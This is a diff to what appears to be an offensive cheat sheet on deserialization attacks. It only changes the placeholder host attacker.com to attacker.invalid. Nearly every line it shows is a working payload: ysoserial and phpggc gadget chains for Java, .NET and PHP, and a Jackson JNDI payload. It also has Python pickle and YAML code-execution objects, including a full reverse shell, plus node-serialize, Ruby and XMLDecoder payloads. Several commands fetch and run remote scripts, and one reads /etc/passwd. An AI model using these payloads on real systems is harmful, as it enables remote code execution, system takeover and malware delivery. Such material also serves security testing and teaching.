@@ -88,24 +88,24 @@ Match the chain to libraries present on the target classpath.
 ```bash
 # CommonsCollections -- most widely applicable
 # CC1: commons-collections 3.1, JDK < 8u72
-java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/cb' > payload.bin
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.invalid/cb' > payload.bin
 # CC5: later JDK versions where CC1 is patched
-java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/cb' > payload.bin
+java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.invalid/cb' > payload.bin
 # CC7: Hashtable entry point, bypasses some ObjectInputFilter rules
 java -jar ysoserial.jar CommonsCollections7 'id > /tmp/proof.txt' > payload.bin
 
 # Spring chain -- requires spring-core + spring-beans
-java -jar ysoserial.jar Spring1 'wget http://attacker.com/s.sh -O /tmp/s.sh' > payload.bin
+java -jar ysoserial.jar Spring1 'wget http://attacker.invalid/s.sh -O /tmp/s.sh' > payload.bin
 # Hibernate chain -- requires hibernate-core
 java -jar ysoserial.jar Hibernate1 'bash -c {echo,BASE64}|{base64,-d}|bash' > payload.bin
 # CommonsBeanutils -- present in many apps via shaded dependencies
-java -jar ysoserial.jar CommonsBeanutils1 'ping -c 3 attacker.com' > payload.bin
+java -jar ysoserial.jar CommonsBeanutils1 'ping -c 3 attacker.invalid' > payload.bin
 
 # URLDNS -- DNS lookup only, no RCE, safe for detection confirmation
-java -jar ysoserial.jar URLDNS 'http://deser-confirm.attacker.com' > payload.bin
+java -jar ysoserial.jar URLDNS 'http://deser-confirm.attacker.invalid' > payload.bin
 
 # JRMPClient -- redirect deser to attacker-controlled JRMP listener
-java -jar ysoserial.jar JRMPClient 'attacker.com:1099' > payload.bin
+java -jar ysoserial.jar JRMPClient 'attacker.invalid:1099' > payload.bin
 # On attacker host, serve secondary payload via JRMP listener
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
 ```
@@ -121,7 +121,7 @@ nmap -sV -p 1099,1098,9010,9011 --script rmi-dumpregistry TARGET
 
 # marshalsec: exploit RMI/JNDI
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
-  "http://attacker.com:8080/#ExploitClass" 1099
+  "http://attacker.invalid:8080/#ExploitClass" 1099
 ```
 
 ### Jackson Polymorphic Typing
@@ -131,7 +131,7 @@ supply a JSON array naming the class to instantiate.
 
 ```json
 ["com.sun.rowset.JdbcRowSetImpl",
- {"dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}]
+ {"dataSourceName":"ldap://attacker.invalid:1389/Exploit","autoCommit":true}]
 ```
 
 Jackson maintainers continuously add classes to a denylist. Check the target's
@@ -169,7 +169,7 @@ phpggc Laravel/RCE1 system 'id' -b        # -b = base64
 phpggc Laravel/RCE10 system 'cat /etc/passwd' -s  # -s = serialized
 
 # Symfony RCE -- targets process component
-phpggc Symfony/RCE4 exec 'curl http://attacker.com/s.sh|bash' -b
+phpggc Symfony/RCE4 exec 'curl http://attacker.invalid/s.sh|bash' -b
 # Monolog RCE -- present in most Composer projects
 phpggc Monolog/RCE1 system 'whoami' -b
 # Guzzle / WordPress chains
@@ -234,17 +234,17 @@ JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings {
 
 ```powershell
 # TypeConfuseDelegate -- broad .NET coverage
-ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.com"
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.invalid"
 # WindowsIdentity -- when TypeConfuseDelegate is blocked
-ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "certutil -urlcache -split -f http://attacker.com/s.exe C:\Temp\s.exe"
+ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "certutil -urlcache -split -f http://attacker.invalid/s.exe C:\Temp\s.exe"
 # TextFormattingRunProperties -- targets WPF/XAML
 ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc.exe"
 # PSObject -- PowerShell-specific
-ysoserial.exe -g PSObject -f BinaryFormatter -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
+ysoserial.exe -g PSObject -f BinaryFormatter -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.invalid/ps.ps1')"
 # Json.NET TypeNameHandling
 ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami > C:\proof.txt"
 # Base64 output for ViewState or cookie injection
-ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping attacker.com" -o base64
+ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping attacker.invalid" -o base64
 ```
 
 ### ViewState Exploitation
@@ -293,7 +293,7 @@ import pickle, os, base64
 
 class Exploit:
     def __reduce__(self):
-        return (os.system, ('curl http://attacker.com/callback',))
+        return (os.system, ('curl http://attacker.invalid/callback',))
 
 payload = pickle.dumps(Exploit())
 print(base64.b64encode(payload).decode())
@@ -303,14 +303,14 @@ class ReverseShell:
     def __reduce__(self):
         return (os.system, (
             'python3 -c \'import socket,subprocess,os;'
-            's=socket.socket();s.connect(("attacker.com",4444));'
+            's=socket.socket();s.connect(("attacker.invalid",4444));'
             'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
             'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',))
 
 # Chained multi-step payload
 class ChainedExploit:
     def __reduce__(self):
-        return (eval, ("__import__('os').system('wget http://attacker.com/i -O /tmp/i && chmod +x /tmp/i && /tmp/i')",))
+        return (eval, ("__import__('os').system('wget http://attacker.invalid/i -O /tmp/i && chmod +x /tmp/i && /tmp/i')",))
 ```
 
 ### yaml.load RCE
@@ -320,7 +320,7 @@ class ChainedExploit:
 ```yaml
 # Direct command execution
 !!python/object/apply:os.system
-- "curl http://attacker.com/callback"
+- "curl http://attacker.invalid/callback"
 
 # Subprocess with output
 !!python/object/apply:subprocess.check_output
@@ -350,7 +350,7 @@ Appending `()` creates an IIFE that executes during deserialization.
 
 ```javascript
 // Trailing () causes immediate execution
-{"role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.com/cb')}()"}
+{"role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.invalid/cb')}()"}
 
 // Base64-wrapped to avoid character issues
 {"p":"_$$ND_FUNC$$_function(){eval(Buffer.from('BASE64PAYLOAD','base64').toString())}()"}
@@ -402,7 +402,7 @@ requirements:
            sets: !ruby/object:Net::WriteAdapter
                socket: !ruby/module 'Kernel'
                method_id: :system
-           git_set: "curl http://attacker.com/callback"
+           git_set: "curl http://attacker.invalid/callback"
        method_id: :resolve
 ```
 
@@ -444,7 +444,7 @@ import redis, pickle, os
 
 class Exploit:
     def __reduce__(self):
-        return (os.system, ('curl http://attacker.com/callback',))
+        return (os.system, ('curl http://attacker.invalid/callback',))
 
 r = redis.Redis(host='target-redis', port=6379)
 r.lpush('celery', pickle.dumps({
@@ -500,7 +500,7 @@ Content-Type: application/x-java-serialized-object
 <java class="java.beans.XMLDecoder">
   <object class="java.lang.Runtime" method="getRuntime">
     <void method="exec">
-      <string>curl http://attacker.com/callback</string>
+      <string>curl http://attacker.invalid/callback</string>
     </void>
   </object>
 </java>
